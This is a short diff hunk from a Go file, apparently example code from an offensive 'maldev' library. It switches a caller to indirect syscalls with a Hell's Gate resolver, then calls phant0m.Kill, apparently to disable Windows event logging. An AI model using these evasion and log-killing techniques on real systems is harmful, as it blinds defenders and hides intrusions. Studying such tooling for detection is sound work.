@@ -90,7 +90,7 @@ import (
     wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
-caller, _ := wsyscall.New(wsyscall.MethodIndirect)
+caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHellsGate())
 if err := phant0m.Kill(caller); err != nil {
     log.Printf("phant0m: %v", err)
 }
